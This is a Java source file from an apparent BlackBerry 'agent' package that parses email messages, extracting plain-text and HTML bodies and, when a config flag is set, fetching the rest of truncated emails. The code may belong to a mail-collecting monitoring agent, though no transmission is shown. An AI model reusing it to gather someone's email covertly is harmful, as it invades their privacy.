//#preprocess
package blackberry.agent.mail;

import java.io.UnsupportedEncodingException;
import java.util.Enumeration;

import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MimeBodyPart;
import net.rim.blackberry.api.mail.Multipart;
import net.rim.blackberry.api.mail.SupportedAttachmentPart;
import net.rim.blackberry.api.mail.TextBodyPart;
import net.rim.blackberry.api.mail.Transport;
import net.rim.blackberry.api.mail.UnsupportedAttachmentPart;
import net.rim.blackberry.api.mail.BodyPart.ContentType;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Check;
import blackberry.utils.Utils;

public class MailParser {
    //#ifdef DEBUG
    static Debug debug = new Debug("MailParser", DebugLevel.INFORMATION);
    //#endif

    private final Message message;
    private final Mail mail;

    public MailParser(final Message message) {
        this.message = message;
        mail = new Mail();
    }

    public final Mail parse() {
        //#ifdef DBC
        Check.requires(message != null, "parse: message != null");
        //#endif

        findEmailBody(message.getContent());

        // HACK: se si vuole si puo' fare un override del body trovato

        if (!mail.hasText()) {
            //#ifdef DEBUG
            debug.warn("Forcing bodytext");
            //#endif
            mail.plainTextMessageContentType = "text/plain; charset=UTF-8\r\n\r\n";
            mail.plainTextMessage = message.getBodyText();
        }

        final String content = message.getBodyText();

        //#ifdef DEBUG
        debug.trace("plain content: " + content);
        debug.trace("plain hex: " + Utils.byteArrayToHex(content.getBytes()));
        //#endif

        //#ifdef DEBUG
        try {
            debug.trace("plain iso: "
                    + Utils.byteArrayToHex(content.getBytes("ISO-8859-1")));
            debug.trace("plain UTF8: "
                    + Utils.byteArrayToHex(content.getBytes("UTF-8")));

        } catch (final UnsupportedEncodingException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        //#endif

        return mail;
    }

    private void findEmailBody(final Object obj) {
        //Reset the attachment flags.
        mail.hasSupportedAttachment = false;
        mail.hasUnsupportedAttachment = false;
        if (obj instanceof Multipart) {
            //#ifdef DEBUG
            debug.trace("Multipart");
            //#endif
            final Multipart mp = (Multipart) obj;
            for (int count = 0; count < mp.getCount(); ++count) {
                findEmailBody(mp.getBodyPart(count));
            }
        } else if (obj instanceof TextBodyPart) {
            //#ifdef DEBUG
            debug.trace("TextBodyPart");
            //#endif
            final TextBodyPart tbp = (TextBodyPart) obj;
            readEmailBody(tbp);
        } else if (obj instanceof MimeBodyPart) {
            //#ifdef DEBUG
            debug.trace("MimeBodyPart");
            //#endif
            final MimeBodyPart mbp = (MimeBodyPart) obj;
            if (mbp.getContentType().indexOf(ContentType.TYPE_TEXT_HTML_STRING) != -1) {
                readEmailBody(mbp);
            }

            else if (mbp.getContentType().equals(
                    ContentType.TYPE_MULTIPART_MIXED_STRING)
                    || mbp.getContentType().equals(
                            ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
                //The message has attachments or we are at the top level of the message.
                //Extract all of the parts within the MimeBodyPart message.
                findEmailBody(mbp.getContent());
            } else {
                //#ifdef DEBUG
                debug.trace("strange mime: " + mbp.getContentType());
                //#endif
            }
        } else if (obj instanceof SupportedAttachmentPart) {
            mail.hasSupportedAttachment = true;
        } else if (obj instanceof UnsupportedAttachmentPart) {
            mail.hasUnsupportedAttachment = true;
        }
    }

    /**
     * MimeBodyPart text/html
     * 
     * @param mbp
     */
    private void readEmailBody(final MimeBodyPart mbp) {
        //#ifdef DEBUG
        debug.trace("readEmailBody: MimeBodyPart");
        //#endif
        //Extract the content of the message.
        final Object obj = mbp.getContent();
        final String mimeType = mbp.getContentType();

        //String encoding = "UTF-8"; // "ISO-8859-1", "UTF-16LE" ... 
        try {
            // aggiunge automaticamente headers.
            final Enumeration enumeration = mbp.getAllHeaders();
            while (enumeration.hasMoreElements()) {

                final Object headerObject = enumeration.nextElement();

                if (headerObject instanceof String) {
                    final String header = (String) headerObject;

                    //#ifdef DEBUG
                    debug.trace("readEmailBody HEADER: " + header + " = "
                            + header);
                    //#endif

                } else {
                    //#ifdef DEBUG

                    debug.error("readEmailBody HEADER: "
                            + headerObject.getClass().getName() + " tostring: "
                            + headerObject.toString());
                    //#endif
                }
            }
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
        }

        String body = null;

        // generazione del body
        if (obj instanceof String) {
            //#ifdef DEBUG
            debug.trace("readEmailBody: from String");
            //#endif
            body = (String) obj;
        } else if (obj instanceof byte[]) {
            //#ifdef DEBUG
            debug.trace("readEmailBody: from byte[]");
            //#endif
            //Usare la codifica latin1 per garantire la lettura 1 byte alla volta
            try {
                body = new String((byte[]) obj, "ISO-8859-1");
            } catch (final UnsupportedEncodingException e) {
                //#ifdef DEBUG
                debug.error(e);
                //#endif
            }
        }

        if (mimeType.indexOf(ContentType.TYPE_TEXT_PLAIN_STRING) != -1) {
            mail.plainTextMessageContentType = "Content-Type: " + mimeType
                    + "\r\n\r\n";
            mail.plainTextMessage = body;
            //Determine if all of the text body part is present.
            if (mbp.hasMore() && !mbp.moreRequestSent()) {
                try {
                    //#ifdef DEBUG
                    debug.info("There's more text: " + Conf.FETCH_WHOLE_EMAIL);
                    //#endif
                    if (Conf.FETCH_WHOLE_EMAIL) {
                        Transport.more(mbp, true);
                    }
                } catch (final Exception ex) {
                    //#ifdef DEBUG
                    debug.error("readEmailBody Mime Text: " + ex);
                    //#endif
                }
            }
        } else if (mimeType.indexOf(ContentType.TYPE_TEXT_HTML_STRING) != -1) {
            mail.htmlMessageContentType = "Content-Type: " + mimeType
                    + "\r\n\r\n";
            mail.htmlMessage = body;
            //Determine if all of the HTML body part is present.
            if (mbp.hasMore() && !mbp.moreRequestSent()) {
                try {
                    //#ifdef DEBUG
                    debug.info("There's more html: " + Conf.FETCH_WHOLE_EMAIL);
                    //#endif
                    if (Conf.FETCH_WHOLE_EMAIL) {
                        Transport.more(mbp, true);
                    }
                } catch (final Exception ex) {
                    //#ifdef DEBUG
                    debug.error("readEmailBody Mime Html: " + ex);
                    //#endif
                }
            }
        } else {
            //#ifdef DEBUG
            debug.info("unknown mimeType: " + mimeType);
            //#endif
        }
    }

    /**
     * text/plain
     * 
     * @param tbp
     */
    private void readEmailBody(final TextBodyPart tbp) {
        //#ifdef DEBUG
        debug.trace("readEmailBody: TextBodyPart");
        //#endif

        String mimeType = tbp.getContentType();
        if (Conf.MAIL_TEXT_FORCE_UTF8) {
            mimeType = "text/plain; charset=UTF-8";
        }

        mail.plainTextMessageContentType = "Content-Type: " + mimeType
                + "\r\n\r\n";

        final String content = (String) tbp.getContent();

        //#ifdef DEBUG
        debug.trace("mail.plainTextMessageContentType: "
                + mail.plainTextMessageContentType);

        debug.trace("content: " + content);
        debug.trace("hex: " + Utils.byteArrayToHex(content.getBytes()));

        try {
            debug.trace("iso: "
                    + Utils.byteArrayToHex(content.getBytes("ISO-8859-1")));
            debug.trace("UTF8: "
                    + Utils.byteArrayToHex(content.getBytes("UTF-8")));
        } catch (final UnsupportedEncodingException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        //#endif

        if (mail.plainTextMessage == null) {
            mail.plainTextMessage = content;
        } else {
            mail.plainTextMessage += "\r\n\r\n" + content;
        }

        if (tbp.hasMore() && !tbp.moreRequestSent()) {
            try {
                if (Conf.FETCH_WHOLE_EMAIL) {
                    Transport.more(tbp, true);
                }
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error("readEmailBody Text: " + ex);
                //#endif
            }
        }
    }
}
